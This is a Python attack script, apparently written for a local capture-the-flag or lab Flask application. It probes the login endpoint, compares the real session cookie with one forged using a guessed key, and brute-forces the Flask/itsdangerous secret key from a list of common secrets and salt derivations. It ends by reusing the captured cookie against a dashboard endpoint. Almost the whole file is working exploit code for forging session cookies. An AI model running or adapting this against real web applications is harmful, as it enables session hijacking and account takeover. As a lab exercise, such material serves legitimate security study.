import base64
import requests
import json
from itsdangerous import URLSafeTimedSerializer, URLSafeSerializer, TimestampSigner, Signer
import hashlib
import hmac

# Target information
base_url = "http://127.0.0.1:32948"
secret_key = "your_secret_key"
original_cookie = "eyJ1c2VyX2lkIjoiMTAwMzIifQ.ac1HnA.FebyScjcMvCp0EyankY0kHuCbcA"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}

# The admin username post returned 200, let's see what it returned
print("[+] Checking what happens with username='admin'...")
resp = requests.post(base_url + "/", data={"username": "admin"}, headers=headers, allow_redirects=False)
print(f"Status: {resp.status_code}")
print(f"Content:\n{resp.text}")

# Let's also check error messages or any info disclosure
print("\n[+] Analyzing original cookie vs forged signatures in detail...")

# Split cookies
orig_parts = original_cookie.split('.')
print(f"Original cookie parts:")
print(f"  Payload: {orig_parts[0]}")
print(f"  Timestamp: {orig_parts[1]}")
print(f"  Signature: {orig_parts[2]}")

# Get a forged cookie with our serializer
serializer = URLSafeTimedSerializer(secret_key)
test_cookie = serializer.dumps({"user_id": "10032"})
test_parts = test_cookie.split('.')
print(f"\nForged cookie with 'your_secret_key':")
print(f"  Payload: {test_parts[0]}")
print(f"  Timestamp: {test_parts[1]}")
print(f"  Signature: {test_parts[2]}")

print(f"\nPayloads match: {orig_parts[0] == test_parts[0]}")

# The payload is {"user_id":"10032"} which should be the same
# Let's decode and check
decoded_orig = base64.urlsafe_b64decode(orig_parts[0] + '==')
decoded_test = base64.urlsafe_b64decode(test_parts[0] + '==')
print(f"Original decoded: {decoded_orig}")
print(f"Test decoded: {decoded_test}")

# The issue is the signatures don't match, which means the secret is different
# Let's try to verify the signature with different secret key derivations

message = orig_parts[0] + '.' + orig_parts[1]
print(f"\nMessage to sign: {message}")

# Try different secrets
secrets_to_try = [
    "your_secret_key",
    "your-secret-key",
    "YOUR_SECRET_KEY",
    "secret",
    "secret_key",
    "supersecret",
    "flask",
    "FLASK",
    "test",
    "testing",
    "development",
    "dev",
    "password",
    "admin",
    "123456",
    "key",
]

print("\n[+] Brute forcing common secret keys...")
for test_secret in secrets_to_try:
    # Try with no salt
    sig = hmac.new(test_secret.encode(), message.encode(), hashlib.sha1).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode('ascii')
    if sig_b64 == orig_parts[2]:
        print(f"  [!] FOUND SECRET (no salt): '{test_secret}'")
        break
    
    # Try with salt
    for salt in ["cookie-session", "itsdangerous", ""]:
        key = salt.encode() + hashlib.sha1(salt.encode() + test_secret.encode()).digest()
        sig = hmac.new(key, message.encode(), hashlib.sha1).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode('ascii')
        if sig_b64 == orig_parts[2]:
            print(f"  [!] FOUND SECRET: '{test_secret}' with salt '{salt}'")
            break
    else:
        continue
    break
else:
    print("  [-] Common secrets didn't match")

# Try empty/none secrets
print("\n[+] Testing empty/minimal secrets...")
for secret in ["", " ", "\n", "\t"]:
    sig = hmac.new(secret.encode(), message.encode(), hashlib.sha1).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode('ascii')
    if sig_b64 == orig_parts[2]:
        print(f"  [!] FOUND empty secret: repr={repr(secret)}")

# What about the timestamp? Maybe we need to use the EXACT timestamp
print("\n[+] Analyzing timestamp...")
ts_bytes = base64.urlsafe_b64decode(orig_parts[1] + '==')
orig_ts = int.from_bytes(ts_bytes, 'little')
print(f"Original timestamp: {orig_ts}")

import time
current_ts = int(time.time())
print(f"Current timestamp: {current_ts}")

# Difference
diff = current_ts - orig_ts
print(f"Difference: {diff} seconds ({diff/3600} hours)")

# The original cookie might have expired - try refreshing with current timestamp
# Actually, Flask sessions don't typically expire based on timestamp alone

print("\n[+] Trying all successful combinations...")
# We know the original cookie works, maybe we just need to accept that 
# and use it to explore more endpoints
resp_dash = requests.get(base_url + "/dashboard", headers=headers, cookies={"session": original_cookie}, allow_redirects=False)
print(f"Dashboard with original cookie: {resp_dash.status_code}")

